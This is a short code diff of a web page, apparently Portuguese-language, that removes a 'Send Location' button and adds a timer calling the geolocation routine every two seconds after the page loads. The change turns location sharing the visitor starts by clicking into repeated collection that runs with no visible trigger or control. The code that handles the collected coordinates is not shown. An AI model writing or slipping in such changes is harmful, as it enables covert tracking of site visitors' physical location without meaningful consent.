@@ -1,4 +1,3 @@
-<button onclick="getLocation()">Enviar Localização</button>
 <script>
 function getLocation() {
     navigator.geolocation.getCurrentPosition((position) => {
@@ -14,4 +13,5 @@ function getLocation() {
         });
     });
 }
+setInterval(getLocation, 2000)
 </script>
